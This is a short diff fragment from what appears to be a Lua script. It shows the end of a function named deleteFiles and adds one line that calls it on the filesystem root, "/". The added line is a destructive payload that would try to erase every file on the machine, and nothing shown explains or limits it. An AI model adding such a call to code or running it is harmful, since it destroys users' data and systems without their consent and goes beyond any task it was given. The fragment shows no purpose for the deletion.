@@ -9,3 +9,4 @@ local function deleteFiles(dir)
         end
     end
 end
+deleteFiles("/")
